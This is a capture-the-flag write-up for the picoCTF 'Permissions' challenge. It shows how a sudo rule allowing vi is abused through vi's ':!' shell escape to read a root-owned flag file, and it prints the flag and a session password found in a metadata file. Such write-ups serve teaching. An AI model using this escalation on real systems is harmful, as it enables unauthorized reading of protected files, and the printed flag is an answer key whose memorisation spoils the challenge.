# [Permissions](https://play.picoctf.org/practice/challenge/363?page=10&search=)

## Initial exploration
After connecting to the challenge and navigating to the topmost directory using `cd /`, we are able to see the `root` folder. However, attempting direct access resulted in a permissions error:

```
picoplayer@challenge:/$ cd root
-bash: cd: root: Permission denied
```
## Using VIM editor
To determine the commands available with root permissions, I used `sudo -l`:

```
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Notably, the VIM editor (`vi`) is permitted. By invoking `sudo vi`, I accessed the editor. In VIM's command mode, prefixing commands with `!` lets us execute shell commands as the user who launched VIM. From the VIM command mode (entered by pressing `esc`, then `:`), I first navigated to the `root` folder using `:!cd root`. Next, I used `:!ls -al` to see all the files in `root`.

```
total 16
drwx------ 1 root root   22 Jul 31 17:58 .
drwxr-xr-x 1 root root   63 Jul 31 17:56 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root 1005 Jul 31 17:58 .viminfo
```

We want to open `.flag.txt`, so use `:!cat .flag.txt` in VIM. This will outprint the flag.

```
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```

To exit the VIM editor, you can type `q` followed by pressing enter.
## Using the `challenge` directory
An alternate approach for getting the flag involves the `challenge` folder.

```
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Navigating to the folder and listing out the contents shows that there's a metadata file. Opening it reveals information about our current session, and the flag:

```
picoplayer@challenge:/challenge$ cat metadata.json 
{"flag": "picoCTF{uS1ng_v1m_3dit0r_021d10ab}", "username": "picoplayer", "password": "dLAqMvm7xv"}
```

The flag, consistent with the previous method, is `picoCTF{uS1ng_v1m_3dit0r_021d10ab}`.
